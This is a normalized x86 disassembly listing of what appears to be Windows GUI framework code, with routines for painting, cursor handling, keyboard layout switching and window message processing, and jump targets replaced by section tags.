mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_494854
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov ecx ebx
mov eax ebx
call sub_493554
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_494888
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_44c2c8
mov edi eax
mov eax edi
call sub_44c3d4
test al al
je r-xdata
cmp [ ebx + 0x254 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x1b8 ]
call sub_46df70
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_496868
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_44c568
jmp r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_48ab2c
jmp r-xdata
sub_494928
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov esi [ ebp + 0x8 ]
cmp [ edi + 0x1e1 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
test [ esi + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x24c ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
test [ esi + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
test [ esi + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x24c ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
movzx eax [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx ebp
mov eax edi
call sub_49017c
test bl bl
je r-xdata
mov eax edi
call sub_496c20
mov eax edi
call sub_49676c
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
movzx eax [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_49676c
test [ esi + 0x18 ] 0xc0
je r-xdata
sub_4949e0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
mov esi eax
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_48fdbc
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_494a34
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_496c20
mov eax esi
call sub_490e18
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor ebx ebx
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1a0 ]
test eax eax
je r-xdata
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov ebx eax
mov ebx [ eax + 0x1a0 ]
jmp r-xdata
mov eax esi
call sub_492060
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_424744
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov si 0xffd0
call sub_4483f8
mov edx esi
mov eax ebx
call sub_424590
pop esi
pop ebx
retn
sub_494acc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x24c ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edi [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x170 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
push 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_48dac0
lea edx [ esp + 0x10 ]
xor ecx ecx
mov eax ebx
call sub_4933e8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_481d20
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47fbcc
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx edi [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
movzx edi [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_494c34
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a0 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_494cae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_48d11c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x30 ]
cmp [ edx + 0x1a0 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor edx edx
mov [ eax + 0x1a0 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x30 ]
mov [ edx + 0x1a0 ] eax
mov [ ebp - 0x5 ] 0x1
sub_494cbc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_494e16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_494e1d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
cmp [ esi + 0x1c8 ] 0x0
je r-xdata
mov eax esi
call sub_496868
movzx edx [ esi + 0x1c4 ]
call sub_49c2c8
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x1c8 ]
call sub_449d80
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47fb48
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f904
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ eax + 0x3c ]
cmp [ esi + 0x1c4 ] 0x0
je r-xdata
push 0x1
push edi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f904
mov edx [ esi + 0x1c8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f904
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
sub_494e24
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_494f32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_494f39
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
cmp [ ebx + 0x1c8 ] 0x0
je r-xdata
cmp [ ebx + 0x1c4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x1c8 ]
call sub_449d80
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47fb48
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_496868
mov dl 0x1
call sub_49c2ac
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_494f98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_432a64
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_48f2b0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1ea ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_494fe8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1f2 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
sub_49501c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_4483f8
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc2
call sub_4483f8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_49505c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x22a ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_48f2b0
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4950b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_42e7b0
mov edx [ r-xdata ]
call sub_4483ac
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_4950f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x1bc ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4246e8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_495114
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_496868
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x20a ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x20c ]
call [ ebx + 0x208 ]
sub_495170
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_4950dc
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x1bc ]
call sub_4246e8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_4951b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c0 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x1c0 ]
call sub_44b8f0
cmp [ ebx + 0x1e4 ] 0x0
je r-xdata
mov dl 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1e3 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x44 ]
mov edx eax
test edx edx
je r-xdata
mov eax ebx
call sub_495308
pop esi
pop ebx
retn
mov eax esi
call sub_44b8f0
jmp r-xdata
sub edx 0xffffff88
cmp [ ebx + 0x254 ] 0x0
jne r-xdata
sub_49521c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xf7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
mov eax ebx
call sub_492f68
sub_495250
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4952f8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1e4 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4952ff
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
mov [ edi + 0x1e4 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_48b790
test bl bl
jne r-xdata
cmp [ edi + 0x1bc ] 0x0
jne r-xdata
mov eax [ edi + 0x1bc ]
call sub_4481b0
xor eax eax
mov [ edi + 0x1bc ] eax
lea eax [ edi + 0x1c0 ]
call sub_44b8d8
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc5
call sub_4483f8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x1c0 ]
call sub_44b8f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ edi + 0x1bc ] eax
sub_49532c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x4c ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_492038
xor edx edx
push ebp
push sub_4953ef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x40 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_4483f8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e3 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4953f6
mov eax [ ebp - 0x4 ]
call sub_492040
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x60 ]
push edx
mov edx [ ebp - 0x8 ]
movzx ecx [ eax + 0x5c ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c0 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_4953f6
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_477028
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_48e210
sub_495444
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov edx ecx
cmp edx eax
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_49060c
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4954ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
lea ecx [ eax + 0x4c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_48e210
sub_4954c4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x212 ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
sub_4954f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov bl 0x1
xor edx edx
mov eax esi
call sub_477028
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_476ee8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp + 0x8 ] ax
lea edx [ esp + 0x8 ]
movzx ecx [ esp ]
mov eax esi
mov si 0xffba
call sub_4483f8
movzx eax [ esp + 0x8 ]
mov [ edi + 0x4 ] ax
cmp [ esp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x285 ] 0x0
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebp
call sub_4954f0
test al al
jne r-xdata
mov dl 0x1
mov eax ebp
call sub_477028
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp ebp [ esp + 0x4 ]
je r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x285 ] 0x0
je r-xdata
mov edx edi
mov eax [ esp + 0x4 ]
call sub_4954f0
test al al
jne r-xdata
sub_4955ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4954f0
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_497c28
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4955d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4954f0
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_497c28
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_495604
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_495630
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_477028
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_476ee8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp + 0x2 ] ax
lea edx [ esp + 0x2 ]
movzx ecx [ esp ]
mov eax esi
mov si 0xffb9
call sub_4483f8
movzx eax [ esp + 0x2 ]
mov [ edi + 0x4 ] ax
cmp [ esp + 0x2 ] 0x0
je r-xdata
cmp [ ebp + 0x285 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_495630
test al al
jne r-xdata
sub_4956ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_495630
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4956cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_495630
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_49570c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_477028
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp ] ax
mov edx esp
mov eax esi
mov si 0xffb8
call sub_4483f8
movzx eax [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x285 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_49570c
test al al
jne r-xdata
sub_495774
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_49570c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_495794
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_48f2b0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_495794
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_495844
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_495794
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x24c ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x40 ]
je r-xdata
mov dl 0x1
mov eax ebx
call sub_477028
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_48f2b0
test eax eax
jne r-xdata
sub_4958f0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_495910
push ebx
push esi
push edi
mov ebx edx
mov edi eax
movzx esi [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_493ce0
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_495944
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_495964
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
cmp [ ebx + 0x16c ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_497da4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_48df00
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_436404
mov ebp eax
mov [ ebx + 0x16c ] ebp
mov eax ebp
call sub_43640c
mov ecx eax
mov edx ebp
mov eax ebx
call sub_48df10
mov eax r-xdata
call sub_436418
mov [ ebx + 0x16c ] eax
jmp r-xdata
sub_4959ec
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_495a10
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
movzx edx [ esp ]
mov eax ebp
call sub_48cf24
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_492534
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_4924f8
movzx edx [ esp ]
mov si 0xffd1
